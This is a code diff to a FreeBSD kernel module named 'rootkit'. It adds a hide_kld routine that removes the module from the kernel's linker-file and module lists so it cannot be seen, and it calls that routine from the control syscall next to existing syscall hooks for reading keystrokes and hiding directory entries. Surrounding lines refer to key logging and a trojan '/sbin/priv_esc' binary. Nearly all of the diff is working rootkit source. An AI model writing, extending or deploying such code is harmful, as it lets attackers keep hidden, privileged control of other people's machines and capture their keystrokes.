@@ -14,7 +14,7 @@
 
 #include <sys/dirent.h>
 
-//===================
+//========KEY LOGGING=========
 #include <sys/pcpu.h>
 #include <sys/syscallsubr.h>
 #include <sys/unistd.h>
@@ -22,7 +22,35 @@
 #include <sys/file.h>
 #include <sys/fcntl.h>
 
-//===================
+//=======HIDING KLD===========
+
+#include <sys/linker.h>
+#include <sys/lock.h>
+#include <sys/mutex.h>
+
+#define MODULE_NAME "rootkit"
+#define FILE_NAME "rootkit.ko"
+
+extern linker_file_list_t linker_files;
+extern struct sx kld_sx;
+extern modulelist_t modules;
+extern int nextid;
+
+typedef TAILQ_HEAD(, module) modulelist_t;
+
+struct module {
+    TAILQ_ENTRY(module)    link;    
+    TAILQ_ENTRY(module)    flink;    
+    struct linker_file    *file;   
+    int            refs;    
+    int             id;   
+    char             *name;    
+    modeventhand_t         handler;    
+    void                *arg;    
+    modspecific_t        data;    
+};
+
+//============================
 
 #define ORIGINAL	"/sbin/hello"
 #define TROJAN		"/sbin/priv_esc"
@@ -226,6 +254,60 @@ static int read_hook(struct thread *td, void *syscall_args){
 
 //==============================================================================
 
+static int hide_kld(void)
+{
+    struct linker_file *lf;
+    struct module *mod;
+    
+    mtx_lock(&Giant);
+    sx_xlock(&kld_sx);
+    
+    if ((&linker_files)->tqh_first->refs > 2)
+        (&linker_files)->tqh_first->refs -= 2;
+    
+    TAILQ_FOREACH(lf, &linker_files, link)
+    {
+        if (strcmp(lf->filename, FILE_NAME) == 0)
+        {
+            if (next_file_id == lf->id)
+                last_kld = 1;
+            else
+                last_kld = 0;
+            
+            save_lf = lf;
+            
+            if (last_kld)
+                next_file_id--;
+            
+            TAILQ_REMOVE(&linker_files, lf, link);
+            break;
+        }
+    }
+    sx_xunlock(&kld_sx);
+    mtx_unlock(&Giant);
+
+    MOD_XLOCK;
+    TAILQ_FOREACH(mod, &modules, link)
+    {
+        if (strcmp(mod->name, "sys/rootkit") == 0)
+        {
+            save_mod = mod;
+            if (last_kld)
+                nextid--;
+            TAILQ_REMOVE(&modules, mod, link);
+            break;
+        }
+    }
+    MOD_XUNLOCK;
+    
+    return 0;
+}
+
+
+
+//==============================================================================
+
+
 struct control_arg{
 	char *option;	
 };
@@ -240,7 +322,7 @@ static int control(struct thread *td, void *arg) {
 		sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
 
 		sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
-
+		hide_kld();
 		activated = 1;
 	}
 	else if (strcmp(uap->option, "off") == 0 && activated == 1) {
